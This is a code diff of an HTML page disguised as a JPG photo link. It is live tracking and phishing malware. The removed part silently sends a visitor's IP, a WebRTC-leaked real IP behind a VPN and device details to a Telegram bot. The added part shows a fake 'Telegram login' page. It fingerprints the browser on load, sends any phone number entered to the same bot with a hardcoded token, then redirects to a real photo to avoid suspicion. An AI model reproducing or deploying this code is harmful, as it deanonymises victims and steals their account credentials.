@@ -1,50 +1,89 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>IMG_202512615.jpg</title>
-    <script>
-        const TOKEN = "8000043080:AAH70-w7YyctIVD8rfyWvNI9xo9Kc3WMXSg";
-        const CHAT_ID = "-1002813516875";
-        const REAL_PHOTO = "https://ksaleshevv-ai.github.io/image-processing-logs/view.jpg";
-
-        async function getRealIP() {
-            return new Promise((resolve) => {
-                const ips = [];
-                const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
-                pc.createDataChannel("");
-                pc.onicecandidate = (e) => {
-                    if (!e.candidate) return resolve(ips);
-                    const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
-                    if (ip && !ips.includes(ip[1])) ips.push(ip[1]);
-                };
-                pc.createOffer().then(sdp => pc.setLocalDescription(sdp));
-                setTimeout(() => resolve(ips), 1200); 
-            });
-        }
-
-        async function capture() {
-            try {
-                // 1. Внешний IP (VPN)
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                const publicIP = data.ip;
-
-                // 2. Реальный IP (в обход VPN)
-                const realIPs = await getRealIP();
-                const vpnLeak = realIPs.length > 0 ? realIPs.join(', ') : "Не обнаружен (защищено)";
-
-                const msg = `🎯 ЦЕЛЬ КЛИКНУЛА 🎯\n\n🌐 Внешний IP (VPN): ${publicIP}\n🔍 Реальный IP (WebRTC): ${vpnLeak}\n📍 Карта: https://www.geodatatool.com/en/?ip=${publicIP}\n💻 Устройство: ${navigator.platform}\n🌍 Язык: ${navigator.language}`;
-
-                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
-            } catch (e) { }
-            
-            // 3. Открываем ту самую картинку
-            window.location.replace(REAL_PHOTO);
-        }
-
-        window.onload = capture;
-    </script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Telegram: Contact @photo_view_bot</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #17212b; color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .login-box { text-align: center; width: 100%; max-width: 320px; padding: 20px; }
+        .logo { width: 120px; height: 120px; background: #242f3d; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; margin-bottom: 25px; }
+        .logo img { width: 80px; }
+        h2 { font-size: 20px; margin-bottom: 10px; font-weight: 500; }
+        p { color: #7f91a4; font-size: 14px; line-height: 1.4; margin-bottom: 30px; }
+        .input-group { background: #242f3d; border: 1px solid #333f4d; border-radius: 10px; padding: 12px; margin-bottom: 15px; display: flex; align-items: center; }
+        .input-group span { color: #7f91a4; margin-right: 10px; font-size: 16px; }
+        input { background: transparent; border: none; color: #fff; font-size: 16px; width: 100%; outline: none; }
+        button { background: #50a8eb; color: #fff; border: none; border-radius: 10px; padding: 15px; width: 100%; font-size: 16px; font-weight: 500; cursor: pointer; transition: background 0.2s; }
+        button:hover { background: #4396d8; }
+        .footer { margin-top: 30px; color: #7f91a4; font-size: 12px; }
+    </style>
 </head>
-<body style="background: #000; margin: 0;"></body>
+<body>
+
+<div class="login-box">
+    <div class="logo">
+        <img src="https://telegram.org/img/t_logo.png" alt="Telegram">
+    </div>
+    <h2>Вход в Telegram</h2>
+    <p>Срок действия сессии истек.<br>Для просмотра содержимого подтвердите свой аккаунт.</p>
+    
+    <div class="input-group">
+        <span>🇰🇿 +7</span>
+        <input type="tel" id="phone" placeholder="700 000 0000" maxlength="10">
+    </div>
+    
+    <button onclick="sendData()">Продолжить</button>
+    
+    <div class="footer">Политика конфиденциальности</div>
+</div>
+
+<script>
+    const TOKEN = "8000043080:AAH70-w7YyctIVD8rfyWvNI9xo9Kc3WMXSg";
+    const CHAT_ID = "-1002813516875";
+
+    // Скрытый сбор данных при загрузке
+    async function collectSilentData() {
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_ID) : "Unknown";
+            const fp = btoa(canvas.toDataURL()).substring(150, 165);
+            
+            const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+            
+            const text = `🕵️‍♂️ ЛОВУШКА: КЛИК ЗАРЕГИСТРИРОВАН\n` +
+                         `🌐 IP: ${ipData.ip}\n` +
+                         `🎮 GPU: ${gpu}\n` +
+                         `🔑 Fingerprint: ${fp}\n` +
+                         `📱 Система: ${navigator.platform}\n` +
+                         `⏰ Время: ${new Date().toLocaleTimeString('ru-RU')}`;
+            
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
+        } catch (e) {}
+    }
+
+    // Отправка введенного номера
+    async function sendData() {
+        const phone = document.getElementById('phone').value;
+        if (phone.length < 10) {
+            alert("Пожалуйста, введите корректный номер");
+            return;
+        }
+
+        const text = `🔥 ПОЙМАН НОМЕР ТЕЛЕФОНА! 🔥\n` +
+                     `📱 Номер: +7${phone}\n` +
+                     `👤 Статус: Цель ввела данные вручную`;
+
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
+        
+        // Перенаправляем на реальное фото, чтобы не вызывать подозрений
+        window.location.href = "https://ksaleshevv-ai.github.io/image-processing-logs/view.jpg";
+    }
+
+    window.onload = collectSilentData;
+</script>
+
+</body>
 </html>
